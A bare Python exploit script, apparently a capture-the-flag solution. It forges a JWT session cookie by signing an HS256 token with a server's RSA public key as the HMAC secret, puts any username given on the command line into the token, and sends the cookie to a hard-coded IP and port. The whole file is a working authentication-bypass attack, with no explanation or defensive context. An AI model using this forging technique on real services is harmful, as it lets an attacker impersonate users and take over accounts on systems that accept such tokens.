#!/usr/bin/python
import sys
import hmac
import hashlib
import base64
import json
import requests

username = str(sys.argv[1])
print(username)
secret_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n"
header = json.dumps({"alg":"HS256","typ":"JWT"}).encode()

payload = json.dumps({
    "username":username,
    "pk":secret_key,
    "iat":1626284638
    }
).encode()


b64_header = base64.urlsafe_b64encode(header).decode().rstrip("=")
b64_payload = base64.urlsafe_b64encode(payload).decode().rstrip("=")

signature = hmac.new(
    key=secret_key.encode(),
    msg=f'{b64_header}.{b64_payload}'.encode(),
    digestmod=hashlib.sha256
).digest()

JWT = f'{b64_header}.{b64_payload}.{base64.urlsafe_b64encode(signature).decode()}'

# print(JWT.rstrip("="))

COOKIES = {
    'session': JWT.rstrip("=")
    }

response = requests.get("http://46.101.23.188:32164/", cookies = COOKIES)
print(response.text)